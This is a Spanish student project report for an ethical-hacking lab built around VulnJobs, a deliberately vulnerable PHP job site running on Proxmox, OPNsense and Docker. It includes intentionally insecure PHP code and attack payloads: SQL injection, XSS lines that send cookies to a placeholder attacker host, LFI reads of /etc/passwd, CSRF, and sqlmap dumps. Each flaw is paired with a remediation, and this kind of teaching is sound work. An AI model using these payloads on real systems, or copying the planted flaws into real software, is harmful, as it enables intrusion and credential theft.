# Documentación Técnica Extendida: Proyecto VulnJobs - Laboratorio de Hacking Ético
## TFG del Ciclo Formativo de Grado Superior en Administración de Sistemas Informáticos en Red (ASIR)
### IES La Marisma - Huelva, Andalucía
#### Autores: Alejandro Mateo Marquez (Lead // Infra + Dev + Pentest), Mario (Colaborador // Revisión Técnica)
#### Fecha: Marzo 2026 | Versión: v1.0-RELEASE
#### Stack: PHP 7.4 + Apache + MySQL 5.7 + Docker + Proxmox VE + OPNsense
#### Cumplimiento: OWASP Top 10 (2021)

---

## Índice
1. [Visión General del Proyecto](#1-visión-general-del-proyecto)
   1.1. Contexto y Objetivos
   1.2. Metodología de Hacking Ético
   1.3. Alcance y Limitaciones
2. [Infraestructura Base: Proxmox VE](#2-infraestructura-base-proxmox-ve)
   2.1. Introducción a Proxmox Virtual Environment
   2.2. Requisitos de Hardware e Instalación
   2.3. Configuración Post-Instalación y Redes
3. [Segmentación de Red: OPNsense](#3-segmentación-de-red-opnsense)
   3.1. Introducción a OPNsense
   3.2. Despliegue de VM en Proxmox
   3.3. Configuración de Interfaces y DHCP
   3.4. Reglas de Firewall para Laboratorio
4. [Servidor Base: Debian 12 Bookworm](#4-servidor-base-debian-12-bookworm)
   4.1. Instalación de Debian NetInstall
   4.2. Configuración Post-Instalación
   4.3. Despliegue de Docker y Docker Compose
5. [Dockerización de Servicios](#5-dockerización-de-servicios)
   5.1. Estructura del Proyecto VulnJobs
   5.2. Dockerfile: Servidor Web PHP+Apache
   5.3. Docker Compose: Orquestación Web + Base de Datos
   5.4. Despliegue y Verificación
6. [Aplicación VulnJobs: Diseño y Funcionalidad](#6-aplicación-vulnjobs-diseño-y-funcionalidad)
   6.1. Arquitectura y Base de Datos
   6.2. Gestión de Usuarios y Roles
   6.3. Paneles y Funcionalidades Principales
7. [Vulnerabilidades Implementadas: OWASP Top 10 (2021)](#7-vulnerabilidades-implementadas-owasp-top-10-2021)
   7.1. VULN-01: SQL Injection (A03:2021)
   7.2. VULN-02: XSS Reflejado (A03:2021)
   7.3. VULN-03: XSS Almacenado (A03:2021)
   7.4. VULN-04: IDOR (A01:2021)
   7.5. VULN-05: LFI / Path Traversal (A01:2021)
   7.6. VULN-06: Broken Access Control (A01:2021)
   7.7. VULN-07: Mass Assignment (A04:2021)
   7.8. VULN-08: Header Injection + CSRF (A05:2021)
8. [Ciclo de Vida de un Ataque Ético](#8-ciclo-de-vida-de-un-ataque-ético)
   8.1. Reconocimiento y Enumeración
   8.2. Escaneo de Vulnerabilidades
   8.3. Explotación y Escalada
9. [Remediación y Hardening](#9-remediación-y-hardening)
   9.1. Corrección de Vulnerabilidades en VulnJobs
   9.2. Hardening de Infraestructura
10. [Conclusiones](#10-conclusiones)
11. [Referencias y Bibliografía](#11-referencias-y-bibliografía)

---

## 1. Visión General del Proyecto
Este proyecto constituye la memoria técnica del Trabajo Final de Grado (TFG) del CFGS ASIR en el IES La Marisma (Huelva). El objetivo es diseñar, desplegar y explotar un entorno de **ciberseguridad ofensiva (hacking ético)** sobre infraestructura virtualizada, cumpliendo con estándares de la normativa vigente y mejores prácticas del sector.

### 1.1 Contexto y Objetivos
El hacking ético es la práctica de penetrar sistemas con autorización explícita para identificar vulnerabilidades. El núcleo del proyecto es **VulnJobs**, una aplicación web vulnerable que simula una red social profesional tipo LinkedIn, construida con malas prácticas de PHP para practicar el **OWASP Top 10 (2021)**, estándar de referencia para riesgos web críticos.

Objetivos específicos:
- Diseñar infraestructura virtualizada con **Proxmox VE** como hipervisor tipo-1.
- Segmentar red con **OPNsense** virtualizado como firewall/router.
- Desplegar servidor **Debian 12** como host Docker.
- Dockerizar VulnJobs (PHP 7.4 + Apache) y MySQL 5.7.
- Implementar vulnerabilidades explotables alineadas con OWASP Top 10.
- Documentar con rigor técnico metodologías de pentesting.

### 1.2 Metodología de Hacking Ético
Se sigue la metodología **PTES (Penetration Testing Execution Standard)**, con 7 fases:
1. **Pre-engagement**: Definición de alcance y autorización (entorno de laboratorio controlado, uso educativo).
2. **Reconocimiento**: Recolección de información.
3. **Escaneo**: Identificación de servicios (Nmap, Nikto).
4. **Explotación**: Aprovechamiento de vulnerabilidades (sqlmap, Burp Suite).
5. **Post-explotación**: Extracción de datos, escalada de privilegios.
6. **Reporte**: Documentación de hallazgos y recomendaciones.

Todo el proceso se realiza bajo **acceso autorizado**, cumpliendo con la LOPD y marcos éticos de INCIBE.

### 1.3 Alcance y Limitaciones
El laboratorio se limita a una red local virtualizada sin conexión a internet para VMs vulnerables. Se usa software 100% libre y hardware reacondicionado. Limitaciones: uso de versiones EOL (PHP 7.4, MySQL 5.7) para simular entornos legacy vulnerables.

---

## 2. Infraestructura Base: Proxmox VE
Proxmox VE es un hipervisor de código abierto basado en Debian, que combina **KVM** (virtualización completa) y **LXC** (contenedores ligeros). Su interfaz web (puerto 8006) gestiona recursos, redes y almacenamiento.

### 2.1 Requisitos de Hardware
- CPU: 4+ cores con virtualización asistida (Intel VT-x / AMD-V)
- RAM: 8 GB mínimo (16 GB recomendado)
- Almacenamiento: 120 GB SSD
- Red: 1 interfaz Gigabit Ethernet

### 2.2 Instalación de Proxmox VE
1. Descargar ISO oficial desde [proxmox.com](https://www.proxmox.com/en/downloads).
2. Grabar en USB:
   ```bash
   dd if=proxmox-ve_8.x-1.iso of=/dev/sdX bs=4M status=progress
   ```
3. Asistente de instalación:
   - Disco: SSD principal
   - Hostname: `pve-lab.local`
   - Red: IP estática `192.168.1.100/24`, Gateway `192.168.1.1`, DNS `8.8.8.8`
4. Acceder a interfaz web: `https://192.168.1.100:8006` (usuario `root`, realm `PAM`).

### 2.3 Configuración Post-Instalación y Redes
Deshabilitar repositorios Enterprise y activar No-Subscription:
```bash
echo "# disabled" > /etc/apt/sources.list.d/pve-enterprise.list
echo "deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription" > /etc/apt/sources.list.d/pve-no-subscription.list
apt update && apt dist-upgrade -y
```

Configuración de bridge `vmbr0` en `/etc/network/interfaces`:
```bash
auto vmbr0
iface vmbr0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    bridge-ports enp3s0
    bridge-stp off
    bridge-fd 0
```
Todas las VMs del laboratorio se conectan a `vmbr0` para comunicación en capa 2.

---

## 3. Segmentación de Red: OPNsense
OPNsense es un firewall/router de código abierto basado en FreeBSD, que proporciona enrutamiento, DHCP, DNS y filtrado stateful. Actúa como punto de control para segmentar la red física de Proxmox y la red interna del lab.

### 3.1 Especificaciones de la VM OPNsense
| Parámetro | Valor |
|-----------|-------|
| CPU | 2 vCPU (tipo: host) |
| RAM | 2 GB |
| Disco | 16 GB VirtIO |
| NIC 1 (WAN) | vmbr0 (red física) |
| NIC 2 (LAN) | vmbr1 (red interna lab) |
| ISO | OPNsense-24.x-dvd-amd64.iso |

### 3.2 Configuración de Interfaces y DHCP
1. Consola OPNsense: **Opción 1: Assign Interfaces**:
   - WAN: `vtnet0` (vmbr0)
   - LAN: `vtnet1` (vmbr1)
2. **Opción 2: Set Interface IP**:
   - LAN IP: `10.10.10.1/24`
   - Rango DHCP: `10.10.10.100` a `10.10.10.200`
3. Interfaz web: `https://10.10.10.1` (credenciales: `root` / `opnsense`).

### 3.3 Reglas de Firewall Permisivas
Para el laboratorio de pentesting, se usan reglas permisivas (NUNCA en producción):
| Interfaz | Protocolo | Origen | Destino | Acción |
|----------|-----------|--------|---------|--------|
| LAN | Any | LAN net | Any | PASS |
| WAN | Any | Any | LAN net | PASS |
| LAN | ICMP | Any | Any | PASS |
| WAN | ICMP | Any | Any | PASS |

Se desactiva **Block private networks** en WAN para permitir comunicación entre subredes RFC1918.

---

## 4. Servidor Base: Debian 12 Bookworm
VM con Debian 12 netinstall (instalación mínima sin GUI) optimizada para contenedores Docker.

### 4.1 Especificaciones de la VM
| Parámetro | Valor |
|-----------|-------|
| OS | Debian 12 Bookworm (netinstall) |
| CPU | 2 vCPU |
| RAM | 2 GB |
| Disco | 20 GB VirtIO SCSI |
| Red | vmbr0 (misma red que VM atacante) |
| IP | 192.168.1.50/24 (estática) |

### 4.2 Instalación y Configuración Post-Instalación
1. Asistente de instalación:
   - Idioma: `es_ES`, Teclado: Spanish
   - Particionado: Disco completo, `/` + swap
   - Paquetes: Solo `SSH server` y `standard system utilities`
2. Configuración de IP estática en `/etc/network/interfaces`:
   ```bash
   auto enp6s0
   iface enp6s0 inet static
       address 192.168.1.50
       netmask 255.255.255.0
       gateway 192.168.1.1
       dns-nameservers 8.8.8.8
   ```
3. Actualizar sistema e instalar herramientas:
   ```bash
   apt update && apt upgrade -y
   apt install -y curl wget git vim sudo ufw net-tools
   ```

### 4.3 Instalación de Docker y Docker Compose
```bash
# Dependencias y clave GPG
apt install -y ca-certificates curl gnupg
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# Repositorio Docker
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | tee /etc/apt/sources.list.d/docker.list

# Instalar Docker + Compose
apt update && apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
systemctl enable --now docker
usermod -aG docker $USER
```

---

## 5. Dockerización de Servicios
VulnJobs se despliega con Docker Compose orquestando dos servicios: servidor web Apache+PHP 7.4 y base de datos MySQL 5.7. El código PHP se monta como volumen para modificaciones en caliente.

### 5.1 Estructura del Proyecto
```
vulnjobs/
├── Dockerfile                # Imagen PHP 7.4 + Apache
├── docker-compose.yml        # Orquestación de servicios
├── db_init/
│   └── init.sql              # Tablas y datos de prueba
└── src/                      # Código fuente de VulnJobs
    ├── index.php             # Login (SQLi)
    ├── portal.php            # Feed (XSS Reflejado)
    ├── perfil.php            # Perfiles (IDOR + XSS Stored)
    ├── admin.php             # Panel admin (BAC + CSRF)
    ├── ver_cv.php            # Visor de archivos (LFI)
    ├── register.php          # Registro (Mass Assignment)
    ├── log_monitor.php       # Logs (Header Injection)
    ├── config.php            # Configuración de BD
    └── style.css             # Estilos CSS
```

### 5.2 Dockerfile: Servidor Web
```dockerfile
FROM php:7.4-apache
# Extensión mysql (obsoleta, intencional para vulnerabilidad)
RUN docker-php-ext-install mysql && docker-php-ext-enable mysql
# Activar mod_rewrite
RUN a2enmod rewrite
# Permisos www-data
RUN chown -R www-data:www-data /var/www/html
```

### 5.3 Docker Compose: Orquestación
```yaml
version: "3.8"
services:
  web:
    build: .
    container_name: vulnjobs_web
    ports:
      - "0.0.0.0:8080:80"  # Expone puerto en todas las interfaces
    volumes:
      - ./src:/var/www/html  # Bind mount para código en tiempo real
    depends_on:
      - db
    networks:
      - lan_vulnerable
  db:
    image: mysql:5.7
    container_name: vulnjobs_db
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: vulnjobs
      MYSQL_USER: user
      MYSQL_PASSWORD: password
    volumes:
      - ./db_init:/docker-entrypoint-initdb.d
    networks:
      - lan_vulnerable
networks:
  lan_vulnerable:
    driver: bridge
```

### 5.4 Despliegue y Verificación
```bash
docker compose up --build -d
docker ps
# Corregir permisos de log
docker exec vulnjobs_web touch /var/www/html/visitas.log
docker exec vulnjobs_web chown www-data:www-data /var/www/html/visitas.log
ufw allow 8080/tcp && ufw reload
curl http://192.168.1.50:8080
```

---

## 6. Aplicación VulnJobs: Diseño y Funcionalidad
VulnJobs simula una red social profesional para búsqueda de empleo, con diseño moderno para recrear un entorno realista de pentesting.

### 6.1 Arquitectura y Base de Datos
Utiliza PHP 7.4 y MySQL 5.7. La tabla `users` se inicializa en `init.sql`:
```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,  # Texto plano (vulnerabilidad A02:2021)
    role ENUM('user', 'admin') DEFAULT 'user',
    bio TEXT  # Campo para XSS almacenado
);
```

### 6.2 Gestión de Usuarios y Roles
| Usuario | Contraseña | Rol | Objetivo en Pentesting |
|---------|------------|-----|------------------------|
| admin | SuperSecretAdmin123 | admin | Comprometer vía SQLi o BAC |
| juan | juan123 | user | Víctima de IDOR y XSS |
| maria | maria123 | user | Víctima de XSS almacenado |

⚠️ **Advertencia**: Contraseñas en texto plano intencionalmente, violando estándares de producción (usar bcrypt/Argon2).

---

## 7. Vulnerabilidades Implementadas: OWASP Top 10 (2021)

### 7.1 VULN-01: SQL Injection (A03:2021 - Injection)
**Ubicación**: `index.php:15`, `portal.php:18`, `perfil.php:12`, `admin.php:21`

#### Descripción Técnica
Consultas SQL concatenan datos de usuario sin sanitización ni sentencias preparadas:
```php
// index.php:15 (vulnerable)
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

#### Explotación
- Bypass de login: `admin'--` como usuario.
- Extracción de datos: `' UNION SELECT 1, username, password, role, bio FROM users--`
- Automatización: `sqlmap -u 'http://192.168.1.50:8080/index.php' --data='username=test&password=test' --dbs`

#### Remediación
Usar sentencias preparadas con PDO:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST['username'], $_POST['password']]);
```

---

### 7.2 VULN-02: XSS Reflejado (A03:2021 - Injection)
**Ubicación**: `portal.php:22` (parámetro `?q=`)

#### Descripción Técnica
El parámetro de búsqueda se imprime sin sanitización:
```php
echo "<p>Resultados para: " . $_GET['q'] . "</p>";
```

#### Explotación
- Robo de cookies: `portal.php?q=<script>fetch('http://ATACANTE/?c='+document.cookie)</script>`

#### Remediación
Codificación de salida: `echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');`

---

### 7.3 VULN-03: XSS Almacenado (A03:2021 - Injection)
**Ubicación**: `perfil.php:18` (campo `bio`)

#### Descripción Técnica
El campo `bio` se guarda en DB sin sanitización y se renderiza a otros usuarios.

#### Explotación
Inyectar en `bio`: `<script>document.location='http://ATACANTE/steal?c='+document.cookie</script>`

#### Remediación
Sanitizar al almacenar y codificar al mostrar.

---

### 7.4 VULN-04: IDOR (A01:2021 - Broken Access Control)
**Ubicación**: `perfil.php:9` (parámetro `?id=`)

#### Descripción Técnica
No se verifica que el ID de perfil pertenezca al usuario autenticado:
```php
$id = $_GET['id'];  # No hay validación de permisos
```

#### Explotación
Editar perfil de admin (id=1) como usuario normal: `perfil.php?id=1` + POST con payload XSS.

#### Remediación
Validar que `$_GET['id'] == $_SESSION['user_id']` o el rol sea admin.

---

### 7.5 VULN-05: LFI / Path Traversal (A01:2021 - Broken Access Control)
**Ubicación**: `ver_cv.php:8` (parámetro `?file=`)

#### Descripción Técnica
El parámetro se concatena sin sanitizar para incluir archivos:
```php
$file = "cvs/" . $_GET['file'];
include($file);
```

#### Explotación
- Leer config: `ver_cv.php?file=../config.php`
- Leer `/etc/passwd`: `ver_cv.php?file=../../etc/passwd`

#### Remediación
Lista blanca de archivos permitidos.

---

### 7.6 VULN-06: Broken Access Control (A01:2021 - Broken Access Control)
**Ubicación**: `admin.php:9` (parámetro `?role=`)

#### Descripción Técnica
El rol se sobreescribe via GET:
```php
if (isset($_GET['role'])) { $_SESSION['role'] = $_GET['role']; }
```

#### Explotación
Acceder a panel admin: `admin.php?role=admin`

#### Remediación
Verificar rol en base de datos, no en sesión manipulable.

---

### 7.7 VULN-07: Mass Assignment (A04:2021 - Insecure Design)
**Ubicación**: `register.php:14` (campo `role` en POST)

#### Descripción Técnica
El backend acepta el campo `role` no esperado:
```php
$query = "INSERT INTO users (username, password, role) VALUES ('" . $_POST['username'] . "', '" . $_POST['password'] . "', '" . $_POST['role'] . "')";
```

#### Explotación
Registrar admin: `curl -X POST http://192.168.1.50:8080/register.php -d 'username=hacker&password=hacker123&role=admin'`

#### Remediación
Especificar campos permitidos explícitamente.

---

### 7.8 VULN-08: Header Injection + CSRF (A05:2021 - Security Misconfiguration)
**Ubicación**: `log_monitor.php:8` (cabecera X-Forwarded-For), `admin.php` (acciones sin CSRF token)

#### Descripción Técnica
- Header Injection: La IP se toma de `X-Forwarded-For` sin sanitizar.
- CSRF: Acciones destructivas via GET sin token.

#### Explotación
- Inyectar SQL en cabecera: `curl -H "X-Forwarded-For: 127.0.0.1' OR 1=1--" http://192.168.1.50:8080/`
- CSRF: `<img src="http://192.168.1.50:8080/admin.php?delete_user=2">`

#### Remediación
Validar cabeceras con regex e implementar tokens CSRF.

---

## 8. Ciclo de Vida de un Ataque Ético
Escenario desde VM Kali Linux (192.168.1.0/24):

### 8.1 Reconocimiento y Enumeración
```bash
nmap -sV -p- 192.168.1.50  # Escaneo de puertos
nikto -h http://192.168.1.50:8080  # Escaneo web
```

### 8.2 Explotación de SQL Injection
```bash
sqlmap -u 'http://192.168.1.50:8080/index.php' --data='username=admin&password=test' --dump -T users
```

### 8.3 Escalada y Post-Explotación
- Acceder a panel admin vía BAC: `admin.php?role=admin`
- Leer credenciales de BD vía LFI: `ver_cv.php?file=../config.php`
- Acceder a MySQL: `mysql -u user -ppassword -h db vulnjobs`

---

## 9. Remediación y Hardening

### 9.1 Corrección de Vulnerabilidades en VulnJobs
- Migrar a PHP 8.x y MySQL 8.x (versiones soportadas).
- Usar PDO con sentencias preparadas para todas las consultas.
- Aplicar codificación de salida en todos los datos renderizados.

### 9.2 Hardening de Infraestructura
1. **Proxmox**: Habilitar 2FA en interfaz web.
2. **OPNsense**: Cambiar a reglas restrictivas, habilitar IDS/IPS (Suricata).
3. **Debian**: Deshabilitar SSH root login, usar claves SSH, configurar fail2ban.
4. **Docker**: No exponer puertos a 0.0.0.0, usar redes aisladas.

---

## 10. Conclusiones
El proyecto ha construido un laboratorio de ciberseguridad ofensiva completo, cubriendo desde la virtualización hasta la explotación de OWASP Top 10. Lecciones aprendidas:
- Importancia de la configuración segura en cada capa del stack.
- Cómo malas prácticas de programación derivan en vulnerabilidades críticas.
- Utilidad de Docker para entornos reproducibles.

⚠️ **Aviso Legal**: Este entorno es exclusivamente para uso educativo en laboratorio controlado. Nunca utilizar estas técnicas contra sistemas sin autorización explícita por escrito.

---

## 11. Referencias y Bibliografía
1. OWASP Top 10 (2021). https://owasp.org/Top10/
2. Proxmox VE Documentation. https://pve.proxmox.com/wiki/Main_Page
3. OPNsense Documentation. https://docs.opnsense.org/
4. Docker Security Best Practices. https://docs.docker.com/engine/security/
5. PHP Manual: Security. https://www.php.net/manual/en/security.php
6. PTES: Penetration Testing Execution Standard. http://www.pentest-st
